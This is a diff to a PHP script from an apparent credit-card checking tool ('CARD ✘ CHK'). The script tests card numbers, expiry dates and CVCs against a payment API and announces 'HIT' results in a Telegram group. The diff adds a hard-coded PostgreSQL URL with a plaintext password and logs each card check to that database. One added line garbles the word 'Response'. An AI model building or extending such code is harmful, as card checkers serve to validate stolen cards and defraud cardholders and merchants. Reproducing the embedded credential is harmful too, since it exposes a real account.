@@ -1,5 +1,6 @@
 <?php
 require_once __DIR__ . '/globalstats.php';
+require_once __DIR__ . '/topusers.php'; // Added topusers.php require_once
 // Check if this is a GET request and show the HTML page immediately
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     header('Content-Type: text/html; charset=utf-8');
@@ -136,6 +137,49 @@ if (checkProxyIP($user_ip)) {
 
 // --- END OF PROXY DETECTION LOGIC ---
 
+// === DATABASE CONNECTION ===
+ $databaseUrl = 'postgresql://card_chk_db_user:Zm2zF0tYtCDNBfaxh46MPPhC0wrB5j4R@dpg-d3l08pmr433s738hj84g-a.oregon-postgres.render.com/card_chk_db';
+
+try {
+    $dbUrl = parse_url($databaseUrl);
+    $host = $dbUrl['host'] ?? null;
+    $port = $dbUrl['port'] ?? 5432;
+    $user = $dbUrl['user'] ?? null;
+    $pass = $dbUrl['pass'] ?? null;
+    $path = $dbUrl['path'] ?? null;
+
+    if (!$host || !$user || !$pass || !$path) {
+        throw new Exception("Missing DB connection parameters");
+    }
+
+    $dbName = ltrim($path, '/');
+    
+    // Set connection timeout with extended options and SSL mode
+    $pdo = new PDO(
+        "pgsql:host=$host;port=$port;dbname=$dbName;sslmode=require",
+        $user,
+        $pass,
+        [
+            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_TIMEOUT => 15,
+            PDO::ATTR_PERSISTENT => false,
+            PDO::ATTR_EMULATE_PREPARES => false
+        ]
+    );
+    
+    // Store the database connection in a global variable for use in recordCardCheck
+    $GLOBALS['pdo'] = $pdo;
+    
+} catch (PDOException $e) {
+    error_log("Database PDO Error in stripeauth.php: " . $e->getMessage());
+    echo json_encode(['status' => 'ERROR', 'message' => 'Database connection error']);
+    exit;
+} catch (Exception $e) {
+    error_log("General Error in stripeauth.php: " . $e->getMessage());
+    echo json_encode(['status' => 'ERROR', 'message' => 'Server error']);
+    exit;
+}
+
 // Include cron_sync.php for validateApiKey
 require_once __DIR__ . '/refresh.php';
 
@@ -256,7 +300,7 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
                "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
                "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
                "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
-               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
+               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐛𝐩𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
                "<b>――――――――――――</b>\n" .
                "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";
 
@@ -319,6 +363,10 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     // Handle API errors
     if ($response === false || $http_code !== 200 || !empty($curl_error)) {
         log_message("API request failed: $curl_error (HTTP $http_code) for $card_details");
+        
+        // Record the failed attempt in the database
+        recordCardCheck($GLOBALS['pdo'], $card_number, 'ERROR', "API request failed: $curl_error (HTTP $http_code)");
+        
         return ['status' => 'DECLINED', 'message' => "API request failed: $curl_error (HTTP $http_code)"];
     }
 
@@ -326,6 +374,10 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc) {
     $result = json_decode($response, true);
     if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
         log_message("Invalid API response: " . substr($response, 0, 100) . " for $card_details");
+        
+        // Record the failed attempt in the database
+        recordCardCheck($GLOBALS['pdo'], $card_number, 'ERROR', "Invalid API response: " . substr($response, 0, 100));
+        
         return ['status' => 'DECLINED', 'message' => "Invalid API response: " . substr($response, 0, 100)];
     }
 
